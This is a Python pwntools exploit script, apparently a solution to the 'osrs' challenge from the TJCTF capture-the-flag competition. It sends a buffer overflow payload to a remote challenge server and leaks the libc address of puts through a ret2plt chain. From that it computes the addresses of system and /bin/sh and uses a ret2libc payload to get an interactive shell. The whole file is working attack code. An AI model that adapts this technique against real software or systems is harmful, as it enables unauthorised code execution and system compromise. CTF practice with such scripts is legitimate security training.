from pwn import *

def exploit():
    # p = process("./osrs")
    p = remote("p1.tjctf.org", 8006)
    binary = ELF("osrs")
    got_puts = binary.got['puts']
    plt_puts = binary.plt['puts']
    main = binary.symbols['main']

    payload = ''
    payload += 'A' * 272
    payload += p32(plt_puts)
    payload += p32(main)
    payload += p32(got_puts)

    p.sendline(payload)

    p.recvuntil(":(\n")
    libc_leak = u32(p.recv(4))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x067360
    log.info("Libc base : {}".format(hex(libc_base)))
    libc_system = libc_base + 0x03cd10
    log.info("Libc system : {}".format(hex(libc_system)))
    libc_binsh = libc_base + 0x17b8cf
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))

    payload = ''
    payload += 'A' * 272
    payload += p32(libc_system)
    payload += 'JUNK'
    payload += p32(libc_binsh)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()